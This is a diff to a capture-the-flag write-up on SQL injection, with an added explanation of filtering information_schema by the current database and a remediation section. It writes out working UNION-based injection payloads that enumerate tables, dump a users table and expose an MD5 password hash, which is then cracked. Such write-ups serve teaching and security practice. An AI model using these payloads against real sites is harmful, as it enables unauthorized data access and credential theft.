@@ -12,9 +12,14 @@ commands:
 1 OR 1=1
 1 ORDER BY 2
 1 UNION SELECT 1, database()
-1 UNION SELECT 1, table_name FROM information_schema.tables
+1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
 1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x7573657273
 1 UNION SELECT first_name, countersign FROM users
+```
+
+get teh hex for users on the terminal:
+```bash
+echo -n "users" | xxd -p
 ```
 
 Found MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28` → cracks to `FortyTwo`
@@ -187,6 +192,40 @@ Surname : 5ff9d0165b4f92b14994e5c685cdce28
 That 32-character string (`5ff9d0165b4f92b14994e5c685cdce28`) is an **MD5 hash**. 
 
 Go to [CrackStation](https://crackstation.net/) and paste `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
+
+## and a shortcut
+That happens because of a very important difference between your two commands: **`WHERE table_schema=database()`**.
+
+When you ran the second command, you left that part out. Here is why that changed the results completely:
+
+### 1. The Short Answer
+
+* **Without the `WHERE` clause:** You asked MySQL to show you *every single table* across the entire database server.
+* **With the `WHERE` clause:** You asked MySQL to *only* show you the tables inside the specific database the website is currently using.
+
+---
+
+### 2. What are those internal tables?
+
+The tables you are seeing (`CHARACTER_SETS`, `COLLATIONS`, `COLUMNS`) are not part of the CTF website. They are internal, system-defined tables that MySQL automatically creates to manage itself.
+
+Every MySQL server has a master database called `information_schema`. Think of it like a giant map or index of the whole server. It contains lists of every column, table, permission, and configuration setting on that machine.
+
+When you typed:
+`1 UNION SELECT 1, table_name FROM information_schema.tables`
+
+MySQL faithfully went into its master index and started spitting out the names of its own internal system tables, one by one. If you kept scrolling down through those hundreds of rows, you would eventually find your CTF table (`users`) buried somewhere in that massive list.
+
+---
+
+### 3. Why `database()` fixed it
+
+When you added `WHERE table_schema=database()` in your previous payload:
+
+1. `database()` tells MySQL: *"What is the name of the current database the website is using?"* (Let's pretend the web app's database is named `darkly_db`).
+2. The `WHERE table_schema=...` clause tells MySQL: *"Filter the master list. Only show me tables where the owner database is `darkly_db`."*
+
+Because it filtered out all the generic system tables, it only returned the actual table created for this CTF challenge: **`users`**.
 
 ## Remediation
 1. **Use parameterized queries (prepared statements)** – Never concatenate user input into SQL strings
